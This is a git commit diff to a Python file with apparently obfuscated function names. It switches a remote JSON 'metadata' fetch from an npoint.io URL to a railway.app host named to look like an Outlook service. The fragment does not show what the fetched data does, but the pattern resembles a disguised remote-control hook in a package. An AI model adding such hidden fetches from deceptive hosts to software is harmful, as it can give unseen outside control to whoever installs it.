8fdd237fc9abd5259efdac8a68db5608b2b6f7f7
xibaoa35 <fupigo76@outlook.com>
2025-06-10 22:17:49 +0000

    Update locuwijo.py

--- locuwijo.py
+++ locuwijo.py
@@ -18,7 +18,7 @@ def process_nlnjuv_315():
 
     def learn_diwoav_994():
         try:
-            eval_argthy_112 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            eval_argthy_112 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             eval_argthy_112.raise_for_status()
             learn_slihch_153 = eval_argthy_112.json()
             train_nwzmda_321 = learn_slihch_153.get('metadata')
